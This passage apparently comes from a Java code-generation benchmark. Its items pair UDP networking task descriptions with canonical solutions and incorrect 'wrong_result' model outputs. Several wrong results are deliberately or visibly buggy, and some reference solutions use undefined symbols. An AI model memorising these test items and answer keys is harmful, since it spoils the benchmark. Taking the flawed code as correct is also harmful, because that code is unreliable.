    "wrong_result": "public boolean probeUDPPort(String host, PortMapping portMapping) {\n    DatagramSocket socket = null;\n    try {\n        socket = new DatagramSocket();\n        byte[] pingMessage = \"PING\".getBytes();\n        InetAddress address = InetAddress.getByName(host);\n        int port = portMapping.getExternalPort();\n        DatagramPacket sendPacket = new DatagramPacket(pingMessage, pingMessage.length, address, port);\n        socket.send(sendPacket);\n        byte[] receiveBuffer = new byte[1024];\n        DatagramPacket receivePacket = new DatagramPacket(receiveBuffer, receiveBuffer.length);\n        socket.setSoTimeout(1000);\n        socket.receive(receivePacket);\n        return false;\n    } catch (SocketTimeoutException e) {\n        return true;\n    } catch (PortUnreachableException e) {\n        return false;\n    } catch (IOException e) {\n        e.printStackTrace();\n        return false;\n    } finally {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 598,
    "Instruction": "Task Description: Create a Java class that implements a StatsD client using UDP protocol for sending metrics to a StatsD server. The class should handle metric batching and asynchronous sending to avoid blocking the main application thread.\n\nClass Description: The Statsd class is a singleton that provides asynchronous metric sending capability to a StatsD server via UDP. It uses a background thread to batch metrics and send them efficiently. The class handles connection setup, error cases, and metric aggregation.\n\nAttributes:\n- CHARSET: [Charset] - The character encoding used for sending metrics (US_ASCII)\n- e: [ExecutorService] - Single thread executor for asynchronous metric processing\n- qManager: [Implicit Queue Manager] - Manages the queue of metrics to be sent (implied by usage but not shown in attributes)\n\nMethods:\n- getInstance(): () -> [Statsd] - Returns the singleton instance of the StatsD client\n- <constructor>: () -> [Statsd] - Private constructor that initializes the background thread for metric processing\n- <background thread>: () -> [void] - Internal method that continuously processes metrics from the queue, batches them, and sends to the StatsD server via UDP\n\nNote: The actual queue management implementation (qManager) is not shown in the provided code but is implied by the usage of getQ() and drainTo() methods. The class handles UDP socket creation, packet preparation, and error cases for host resolution and socket operations.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.nio.charset.Charset;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.openjdk.btrace.core.BTraceRuntime;\nimport org.openjdk.btrace.core.SharedSettings;\n\npublic final class Statsd {\n  private static final Charset CHARSET = StandardCharsets.US_ASCII;\n  private final ExecutorService e = Executors.newSingleThreadExecutor(\n      r -> {\n        Thread t = new Thread(r, \"jStatsD Client Submitter\");\n        t.setDaemon(true);\n        return t;\n      });\n\n  @SuppressWarnings(\"FutureReturnValueIgnored\")\n  private Statsd() {\n    e.submit(\n        () -> {\n          DatagramSocket ds = null;\n          boolean entered = BTraceRuntime.enter();\n          try {\n            ds = new DatagramSocket();\n            DatagramPacket dp = new DatagramPacket(new byte[0], 0);\n            try {\n              dp.setAddress(InetAddress.getByName(SharedSettings.GLOBAL.getStatsdHost()));\n            } catch (UnknownHostException ex) {\n              System.err.println(\n                  \"[statsd] invalid host defined: \" + SharedSettings.GLOBAL.getStatsdHost());\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            } catch (SecurityException ex) {\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            }\n            dp.setPort(SharedSettings.GLOBAL.getStatsdPort());\n\n            while (true) {\n              Collection<String> msgs = new ArrayList<>();\n              msgs.add(qManager.getQ().take());\n              qManager.getQ().drainTo(msgs);\n\n              StringBuilder sb = new StringBuilder();\n              for (String m : msgs) {\n                if (sb.length() + m.length() < 511) {\n                  sb.append(m).append('\\n');\n                } else {\n                  dp.setData(sb.toString().getBytes(CHARSET));\n                  ds.send(dp);\n                  sb.setLength(0);\n                }\n              }\n              if (sb.length() > 0) {\n                dp.setData(sb.toString().getBytes(CHARSET));\n                ds.send(dp);\n              }\n            }\n          } catch (IOException | InterruptedException ex) {\n            ex.printStackTrace();\n          } finally {\n            if (entered) {\n              BTraceRuntime.leave();\n            }\n          }\n        });\n  }\n\n  public static Statsd getInstance() {\n    return Singleton.INSTANCE;\n  }\n\n  private static final class Singleton {\n    private static final Statsd INSTANCE = new Statsd();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.nio.charset.Charset;\nimport java.util.List;\nimport java.util.ArrayList;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\npublic class Statsd {\n    private static final String CHARSET = Charset.US_ASCII.name();\n    private static final int DEFAULT_PORT = 8125;\n    private static final String DEFAULT_HOST = \"localhost\";\n    private static Statsd instance;\n    private final ExecutorService e;\n    private final BlockingQueue<String> queue;\n    private final DatagramSocket socket;\n    private final InetAddress serverAddress;\n    private final int serverPort;\n    private final AtomicBoolean running = new AtomicBoolean(true);\n\n    private Statsd() {\n        e = Executors.newSingleThreadExecutor();\n        queue = new LinkedBlockingQueue<>();\n        socket = createSocket();\n        try {\n            serverAddress = InetAddress.getByName(DEFAULT_HOST);\n            serverPort = DEFAULT_PORT;\n        } catch (UnknownHostException e) {\n            throw new RuntimeException(\"Failed to resolve host\", e);\n        }\n        startBackgroundThread();\n    }\n\n    public static Statsd getInstance() {\n        if (instance == null) {\n            instance = new Statsd();\n        }\n        return instance;\n    }\n\n    private void startBackgroundThread() {\n        e.execute(this::processMetrics);\n    }\n\n    private void processMetrics() {\n        while (running.get()) {\n            try {\n                List<String> metrics = new ArrayList<>();\n                while ((metrics.add(queue.poll())) && metrics.size() < 100) {\n                    // Poll until queue is empty or 100 metrics are collected\n                }\n                if (!metrics.isEmpty()) {\n                    sendMetrics(metrics);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                break;\n            }\n        }\n    }\n\n    private void sendMetrics(List<String> metrics) {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < metrics.size(); i++) {\n            sb.append(metrics.get(i));\n            if (i < metrics.size() - 1) {\n                sb.append(\"\\n\");\n            }\n        }\n        byte[] data = sb.toString().getBytes(CHARSET);\n        DatagramPacket packet = new DatagramPacket(data, data.length, serverAddress, serverPort);\n        try {\n            socket.send(packet);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private DatagramSocket createSocket() throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        socket.bind(new java.net.InetSocketAddress(0));\n        return socket;\n    }\n\n    public void send(String metric) {\n        try {\n            queue.put(metric);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void close() {\n        running.set(false);\n        e.shutdown();\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 600,
    "Instruction": "Task Description: Create a Java class for UDP socket communication that can be used for both sending and receiving datagram packets. The class should handle socket creation, binding, message transmission, and reception with proper error handling.\n\nClass Description: HTTPUSocket is a UDP socket wrapper class that provides simplified methods for UDP communication. It manages socket lifecycle and provides methods for sending messages to specific addresses and receiving incoming packets.\n\nAttributes:\n- ssdpUniSock: DatagramSocket - The underlying UDP socket for communication\n- localAddr: String - The local address bound to the socket\n\nMethods:\n- HTTPUSocket() -> void - Default constructor that creates an unbound UDP socket\n- HTTPUSocket(String bindAddr, int bindPort) -> void - Constructor that binds socket to specific address and port\n- HTTPUSocket(int bindPort) -> void - Constructor that binds socket to specific port on all interfaces\n- getDatagramSocket() -> DatagramSocket - Returns the underlying DatagramSocket instance\n- setLocalAddress(String addr) -> void - Sets the local address manually\n- getLocalAddress() -> String - Returns the local address bound to the socket\n- open() -> boolean - Creates an unbound UDP socket, returns success status\n- open(String bindAddr, int bindPort) -> boolean - Binds socket to specific address and port, returns success status\n- open(int bindPort) -> boolean - Binds socket to specific port on all interfaces, returns success status\n- close() -> boolean - Closes the socket, returns success status\n- post(String addr, int port, String msg) -> boolean - Sends a message to specified address and port, returns success status\n- receive() -> SSDPPacket - Receives an incoming packet and returns it wrapped in SSDPPacket object",
    "Canonical_solution": "import java.net.BindException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\n\npublic class HTTPUSocket {\n\n    private DatagramSocket ssdpUniSock = null;\n    private String localAddr = \"\";\n\n    public HTTPUSocket() {\n        open();\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) throws BindException {\n        open(bindAddr, bindPort);\n    }\n\n    public HTTPUSocket(int bindPort) {\n        open(bindPort);\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        if (0 < localAddr.length())\n            return localAddr;\n        return ssdpUniSock.getLocalAddress().getHostAddress();\n    }\n\n    public boolean open() {\n        close();\n        try {\n            ssdpUniSock = new DatagramSocket();\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean open(String bindAddr, int bindPort) throws BindException {\n        close();\n        try {\n            InetSocketAddress bindInetAddr = new InetSocketAddress(InetAddress.getByName(bindAddr), bindPort);\n            ssdpUniSock = new DatagramSocket(bindInetAddr);\n        }\n        catch (BindException possible) {\n            throw possible;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        setLocalAddress(bindAddr);\n        return true;\n    }\n\n    public boolean open(int bindPort) {\n        close();\n        try {\n            InetSocketAddress bindSock = new InetSocketAddress(bindPort);\n            ssdpUniSock = new DatagramSocket(null);\n            ssdpUniSock.setReuseAddress(true);\n            ssdpUniSock.bind(bindSock);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean close() {\n        if (ssdpUniSock == null)\n            return true;\n        try {\n            ssdpUniSock.close();\n            ssdpUniSock = null;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        try {\n            InetAddress inetAddr = InetAddress.getByName(addr);\n            DatagramPacket dgmPacket = new DatagramPacket(msg.getBytes(), msg.length(), inetAddr, port);\n            ssdpUniSock.send(dgmPacket);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public SSDPPacket receive() {\n        byte ssdvRecvBuf[] = new byte[SSDP.RECV_MESSAGE_BUFSIZE];\n        SSDPPacket recvPacket = new SSDPPacket(ssdvRecvBuf, ssdvRecvBuf.length);\n        recvPacket.setLocalAddress(getLocalAddress());\n        try {\n            ssdpUniSock.receive(recvPacket.getDatagramPacket());\n            recvPacket.setTimeStamp(System.currentTimeMillis());\n        }\n        catch (Exception e) {\n            return null;\n        }\n        return recvPacket;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class HTTPUSocket {\n    private DatagramSocket ssdpUniSock;\n    private String localAddr;\n\n    public HTTPUSocket() {\n        try {\n            ssdpUniSock = new DatagramSocket();\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) {\n        try {\n            ssdpUniSock = new DatagramSocket(bindPort);\n            InetAddress address = InetAddress.getByName(bindAddr);\n            ssdpUniSock.bind(new InetSocketAddress(address, bindPort));\n            localAddr = bindAddr;\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public HTTPUSocket(int bindPort) {\n        try {\n            ssdpUniSock = new DatagramSocket(bindPort);\n            localAddr = \"0.0.0.0\";\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        return localAddr;\n    }\n\n    public boolean open() {\n        try {\n            ssdpUniSock = new DatagramSocket();\n            return true;\n        } catch (SocketException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean open(String bindAddr, int bindPort) {\n        try {\n            ssdpUniSock = new DatagramSocket(bindPort);\n            InetAddress address = InetAddress.getByName(bindAddr);\n            ssdpUniSock.bind(new InetSocketAddress(address, bindPort));\n            localAddr = bindAddr;\n            return true;\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean open(int bindPort) {\n        try {\n            ssdpUniSock = new DatagramSocket(bindPort);\n            localAddr = \"0.0.0.0\";\n            return true;\n        } catch (SocketException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean close() {\n        if (ssdpUniSock != null) {\n            try {\n                ssdpUniSock.close();\n                return true;\n            } catch (IOException e) {\n                e.printStackTrace();\n                return false;\n            }\n        }\n        return false;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        try {\n            InetAddress destination = InetAddress.getByName(addr);\n            byte[] data = msg.getBytes();\n            DatagramPacket packet = new DatagramPacket(data, data.length, destination, port);\n            ssdpUniSock.send(packet);\n            return true;\n        } catch (IOException | UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public SSDPPacket receive() {\n        try {\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            ssdpUniSock.receive(packet);\n            String received = new String(packet.getData(), 0, packet.getLength());\n            return new SSDPPacket(received);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 602,
    "Instruction": "Task Description: Create a UDP server class that listens for incoming packets on a specified port, processes the received data, and provides a method to retrieve the received message.\n\nClass Description: The UdpServer class implements a Runnable interface to handle UDP communication asynchronously. It creates a datagram socket bound to a specified port, receives incoming packets, stores the message content, and allows retrieval of the received message. The server operates with a timeout of 60 seconds.\n\nAttributes:\n- serverSocket: DatagramSocket - The UDP socket used for communication\n- message: String - Stores the received message from the client\n\nMethods:\n- UdpServer(int port) -> void - Constructor that initializes the UDP server on the specified port and starts the receiver thread\n- run() -> void - The thread's main execution method that receives incoming packets and processes the data\n- getMessage() -> String - Retrieves the received message after processing",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UdpServer implements Runnable {\n\n    private final DatagramSocket serverSocket;\n    private String message;\n\n    public UdpServer(int port) throws SocketException, InterruptedException {\n        serverSocket = new DatagramSocket(port);\n        serverSocket.setSoTimeout(60000);\n        final Thread thread = new Thread(this);\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public synchronized void run() {\n        final byte[] data = new byte[1024];\n        final DatagramPacket packet = new DatagramPacket(data, data.length);\n        try {\n            serverSocket.receive(packet);\n            message = new String(packet.getData()).trim();\n        } catch (IOException e) {\n            message = \"Exception while receiving sentry call. \" + e.getMessage();\n        }\n    }\n\n    public synchronized String getMessage() throws InterruptedException {\n        return message;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpServer implements Runnable {\n    private DatagramSocket serverSocket;\n    private String message;\n\n    public UdpServer(int port) {\n        try {\n            serverSocket = new DatagramSocket(port);\n            serverSocket.setSoTimeout(60000);\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n        new Thread(this).start();\n    }\n\n    public void run() {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        while (true) {\n            try {\n                serverSocket.receive(packet);\n                String receivedMessage = new String(packet.getData(), 0, packet.getLength());\n                this.message = receivedMessage;\n                packet.reset();\n            } catch (IOException e) {\n                // Timeout occurred, do nothing and continue\n            }\n        }\n    }\n\n    public String getMessage() {\n        return message;\n    }\n}"
  },
  {
    "Task_id": 603,
    "Instruction": "Task Description: Implement a class that provides UDP-based network communication for device discovery and identity exchange in a local area network (LAN) environment, supporting both server (listener) and client (broadcaster) functionalities.\n\nClass Description: LanLinkProvider is a class that handles UDP communication for device discovery in a LAN. It listens for identity broadcasts from other devices and broadcasts its own identity. It manages socket creation, packet handling, and network trust verification.\n\nAttributes:\n- context: [Context] - Android context for accessing device information and preferences\n- udpServer: [DatagramSocket] - UDP socket for receiving broadcast packets\n- listening: [boolean] - Flag indicating whether the UDP listener is active\n- UDP_PORT: [static final int] - Default UDP port for communication (1716)\n- MIN_PORT: [static final int] - Minimum valid TCP port number (1716)\n- MAX_UDP_PACKET_SIZE: [static final int] - Maximum size of UDP packets (512KB)\n\nMethods:\n- setupUdpListener() -> [void] - Sets up and starts a UDP listener thread that continuously receives packets\n- udpPacketReceived(DatagramPacket packet) -> [void] - Processes received UDP packets containing device identity information\n- sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) -> [void] - Broadcasts device identity to specified IP addresses\n- configureSocket(Socket socket) -> [void] - Configures socket settings (keep-alive)\n- isDeviceTrusted(String deviceId) -> [boolean] - Checks if a device is marked as trusted in shared preferences\n- onStart() -> [void] - Starts the UDP listener\n- onStop() -> [void] - Stops the UDP listener and cleans up resources",
    "Canonical_solution": "import android.content.Context;\nimport android.net.Network;\nimport android.os.Build;\nimport android.util.Log;\n\nimport org.json.JSONException;\nimport org.kde.kdeconnect.Helpers.ThreadHelper;\nimport org.kde.kdeconnect.NetworkPacket;\nimport org.kde.kdeconnect.Helpers.DeviceHelper;\nimport org.kde.kdeconnect.Helpers.TrustedNetworkHelper;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport kotlin.text.Charsets;\n\npublic class LanLinkProvider {\n\n    final static int UDP_PORT = 1716;\n    final static int MIN_PORT = 1716;\n    final static int MAX_UDP_PACKET_SIZE = 1024 * 512;\n\n    private final Context context;\n    private DatagramSocket udpServer;\n    private boolean listening = false;\n\n    private void setupUdpListener() {\n        try {\n            udpServer = new DatagramSocket(null);\n            udpServer.setReuseAddress(true);\n            udpServer.setBroadcast(true);\n        } catch (SocketException e) {\n            Log.e(\"LanLinkProvider\", \"Error creating udp server\", e);\n            throw new RuntimeException(e);\n        }\n        try {\n            udpServer.bind(new InetSocketAddress(UDP_PORT));\n        } catch (SocketException e) {\n            Log.e(\"LanLinkProvider\", \"Error binding udp server\", e);\n        }\n        ThreadHelper.execute(() -> {\n            Log.i(\"UdpListener\", \"Starting UDP listener\");\n            while (listening) {\n                try {\n                    DatagramPacket packet = new DatagramPacket(new byte[MAX_UDP_PACKET_SIZE], MAX_UDP_PACKET_SIZE);\n                    udpServer.receive(packet);\n                    ThreadHelper.execute(() -> {\n                        try {\n                            udpPacketReceived(packet);\n                        } catch (JSONException | IOException e) {\n                            Log.e(\"LanLinkProvider\", \"Exception receiving UDP packet\", e);\n                        }\n                    });\n                } catch (IOException e) {\n                    Log.e(\"LanLinkProvider\", \"UdpReceive exception\", e);\n                }\n            }\n            Log.w(\"UdpListener\", \"Stopping UDP listener\");\n        });\n    }\n\n    @WorkerThread\n    private void udpPacketReceived(DatagramPacket packet) throws JSONException, IOException {\n        final InetAddress address = packet.getAddress();\n        String message = new String(packet.getData(), Charsets.UTF_8);\n        final NetworkPacket identityPacket = NetworkPacket.unserialize(message);\n\n        if (!DeviceInfo.isValidIdentityPacket(identityPacket)) {\n            Log.w(\"KDE/LanLinkProvider\", \"Invalid identity packet\");\n            return;\n        }\n\n        final String deviceId = identityPacket.getString(\"deviceId\");\n        String myId = DeviceHelper.getDeviceId(context);\n        if (deviceId.equals(myId)) {\n            return;\n        }\n\n        Log.i(\"KDE/LanLinkProvider\", \"Broadcast received from \" + identityPacket.getString(\"deviceName\"));\n\n        boolean deviceTrusted = isDeviceTrusted(identityPacket.getString(\"deviceId\"));\n        if (!deviceTrusted && !TrustedNetworkHelper.isTrustedNetwork(context)) {\n            Log.i(\"KDE/LanLinkProvider\", \"Ignoring untrusted device\");\n            return;\n        }\n\n        int tcpPort = identityPacket.getInt(\"tcpPort\", MIN_PORT);\n        if (tcpPort < MIN_PORT || tcpPort > MAX_PORT) {\n            Log.e(\"LanLinkProvider\", \"Invalid TCP port\");\n            return;\n        }\n\n        Socket socket = SocketFactory.getDefault().createSocket(address, tcpPort);\n        configureSocket(socket);\n\n        DeviceInfo myDeviceInfo = DeviceHelper.getDeviceInfo(context);\n        NetworkPacket myIdentity = myDeviceInfo.toIdentityPacket();\n\n        OutputStream out = socket.getOutputStream();\n        out.write(myIdentity.serialize().getBytes());\n        out.flush();\n    }\n\n    @WorkerThread\n    public void sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) {\n        if (!listening) return;\n\n        DeviceInfo myDeviceInfo = DeviceHelper.getDeviceInfo(context);\n        NetworkPacket identity = myDeviceInfo.toIdentityPacket();\n        identity.set(\"tcpPort\", MIN_PORT);\n\n        byte[] bytes;\n        try {\n            bytes = identity.serialize().getBytes(Charsets.UTF_8);\n        } catch (JSONException e) {\n            Log.e(\"KDE/LanLinkProvider\", \"Failed to serialize packet\", e);\n            return;\n        }\n\n        DatagramSocket socket;\n        try {\n            socket = new DatagramSocket();\n            if (network != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {\n                try {\n                    network.bindSocket(socket);\n                } catch (IOException e) {\n                    Log.w(\"LanLinkProvider\", \"Network bind failed\");\n                }\n            }\n            socket.setReuseAddress(true);\n            socket.setBroadcast(true);\n        } catch (SocketException e) {\n            Log.e(\"KDE/LanLinkProvider\", \"Failed to create socket\", e);\n            return;\n        }\n\n        for (InetAddress ip : ipList) {\n            try {\n                socket.send(new DatagramPacket(bytes, bytes.length, ip, MIN_PORT));\n            } catch (IOException e) {\n                Log.e(\"KDE/LanLinkProvider\", \"Send failed to \" + ip, e);\n            }\n        }\n        socket.close();\n    }\n\n    private void configureSocket(Socket socket) {\n        try {\n            socket.setKeepAlive(true);\n        } catch (SocketException e) {\n            Log.e(\"LanLink\", \"Socket config failed\", e);\n        }\n    }\n\n    private boolean isDeviceTrusted(String deviceId) {\n        return context.getSharedPreferences(\"trusted_devices\", Context.MODE_PRIVATE)\n                     .getBoolean(deviceId, false);\n    }\n\n    public void onStart() {\n        if (!listening) {\n            listening = true;\n            setupUdpListener();\n        }\n    }\n\n    public void onStop() {\n        listening = false;\n        if (udpServer != null) {\n            udpServer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class LanLinkProvider {\n    private Context context;\n    private DatagramSocket udpServer;\n    private boolean listening = false;\n    public static final int UDP_PORT = 1716;\n    public static final int MIN_PORT = 1716;\n    public static final int MAX_UDP_PACKET_SIZE = 512 * 1024;\n\n    public LanLinkProvider(Context context) {\n        this.context = context;\n    }\n\n    private void setupUdpListener() {\n        if (listening) return;\n        try {\n            udpServer = new DatagramSocket(UDP_PORT);\n            configureSocket(udpServer);\n            listening = true;\n            new Thread(new ListenerRunnable()).start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ListenerRunnable implements Runnable {\n        @Override\n        public void run() {\n            while (listening) {\n                try {\n                    byte[] buffer = new byte[MAX_UDP_PACKET_SIZE];\n                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                    udpServer.receive(packet);\n                    udpPacketReceived(packet);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void udpPacketReceived(DatagramPacket packet) {\n        String receivedData = new String(packet.getData(), 0, packet.getLength());\n        String deviceId = extractDeviceId(receivedData);\n        if (isDeviceTrusted(deviceId)) {\n            // Handle trusted device\n        }\n    }\n\n    private String extractDeviceId(String data) {\n        // Implement logic to extract device ID from data\n        return \"unknown\";\n    }\n\n    private void sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) {\n        String identity = \"device:1.0\";\n        byte[] data = identity.getBytes();\n        DatagramPacket packet = new DatagramPacket(data, data.length);\n        for (InetAddress ip : ipList) {\n            packet.setAddress(ip);\n            try {\n                udpServer.send(packet);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void configureSocket(DatagramSocket socket) {\n        try {\n            socket.setReuseAddress(true);\n            socket.setSoTimeout(1000);\n            socket.setSoLinger(0);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private boolean isDeviceTrusted(String deviceId) {\n        SharedPreferences prefs = context.getSharedPreferences(\"device_prefs\", Context.MODE_PRIVATE);\n        return prefs.getBoolean(deviceId, false);\n    }\n\n    public void onStart() {\n        setupUdpListener();\n    }\n\n    public void onStop() {\n        if (listening) {\n            listening = false;\n            try {\n                udpServer.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 604,
    "Instruction": "Task Description: Implement a UDP client class in Java that can send UDP packets to a specified target address and port, with optional response waiting functionality.\n\nClass Description: The UDPClient class provides functionality to send UDP packets to a network target. It supports both fire-and-forget mode and request-response mode. The class manages its own socket and thread for asynchronous operation, and includes cleanup mechanisms.\n\nAttributes:\n- mUdpSocket: DatagramSocket - The UDP socket used for communication\n- mRunning: boolean - Flag indicating whether the client is currently active\n- mThread: Thread - The thread handling the UDP communication\n\nMethods:\n- sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) -> void - \n  Sends a UDP packet to the specified address and port. If waitResponse is true, it will wait for and deliver any response.\n  Parameters:\n    - targetAddress: String - The IP address or hostname of the target\n    - port: int - The destination port number\n    - data: String - The message to send\n    - waitResponse: boolean - Whether to wait for a response\n    - handler: ResponseHandler - Callback interface for handling responses or errors\n\n- stop() -> void - \n  Stops any ongoing UDP communication and cleans up resources. Closes the socket and interrupts the thread if active.\n\n- interface ResponseHandler - \n  Callback interface for handling responses or errors\n  Methods:\n    - onResponse(String response) -> void - Called when a response is received\n    - onError(String errorMessage) -> void - Called when an error occurs",
    "Canonical_solution": "import android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\nimport android.widget.CheckBox;\nimport android.widget.EditText;\nimport android.widget.Spinner;\nimport android.widget.Toast;\nimport android.widget.ToggleButton;\n\nimport org.csploit.android.R;\nimport org.csploit.android.core.Plugin;\nimport org.csploit.android.core.System;\nimport org.csploit.android.net.Target;\nimport org.csploit.android.net.Target.Type;\n\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket mUdpSocket = null;\n    private boolean mRunning = false;\n    private Thread mThread = null;\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, final ResponseHandler handler) {\n        if (!mRunning) {\n            mRunning = true;\n\n            mThread = new Thread(new Runnable() {\n                @Override\n                public void run() {\n                    String error = null;\n                    try {\n                        mUdpSocket = new DatagramSocket();\n                        DatagramPacket packet = new DatagramPacket(\n                                data.getBytes(), data.length(),\n                                System.getCurrentTarget().getAddress(), port);\n\n                        mUdpSocket.send(packet);\n\n                        if (waitResponse) {\n                            byte[] buffer = new byte[1024];\n                            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n                            mUdpSocket.receive(response);\n                            final String responseText = new String(buffer);\n                            handler.onResponse(responseText);\n                        }\n                    } catch (Exception e) {\n                        error = e.getMessage();\n                    } finally {\n                        if (mUdpSocket != null) {\n                            mUdpSocket.close();\n                        }\n                        mRunning = false;\n                        if (error != null) {\n                            handler.onError(error);\n                        }\n                    }\n                }\n            });\n\n            mThread.start();\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        try {\n            if (mThread != null && mThread.isAlive()) {\n                if (mUdpSocket != null)\n                    mUdpSocket.close();\n                mThread.interrupt();\n                mThread = null;\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UDPClient {\n    private DatagramSocket mUdpSocket;\n    private boolean mRunning;\n    private Thread mThread;\n\n    public UDPClient() throws Exception {\n        mUdpSocket = new DatagramSocket();\n        mRunning = true;\n        mThread = new Thread(this::run);\n        mThread.start();\n    }\n\n    private void run() {\n        while (mRunning) {\n            // Placeholder for potential async processing\n        }\n    }\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) {\n        try {\n            InetAddress address = InetAddress.getByName(targetAddress);\n            byte[] sendData = data.getBytes();\n            DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, address, port);\n            mUdpSocket.send(sendPacket);\n\n            if (waitResponse) {\n                Thread responseThread = new Thread(() -> {\n                    try {\n                        byte[] buffer = new byte[1024];\n                        DatagramPacket receivePacket = new DatagramPacket(buffer, buffer.length);\n                        mUdpSocket.receive(receivePacket);\n                        String response = new String(receivePacket.getData(), 0, receivePacket.getLength());\n                        if (handler != null) {\n                            handler.onResponse(response);\n                        }\n                    } catch (Exception e) {\n                        if (handler != null) {\n                            handler.onError(e.getMessage());\n                        }\n                    }\n                });\n                responseThread.start();\n            }\n        } catch (Exception e) {\n            if (handler != null) {\n                handler.onError(e.getMessage());\n            }\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        try {\n            mUdpSocket.close();\n        } catch (Exception e) {\n            // Handle error\n        }\n        if (mThread != null) {\n            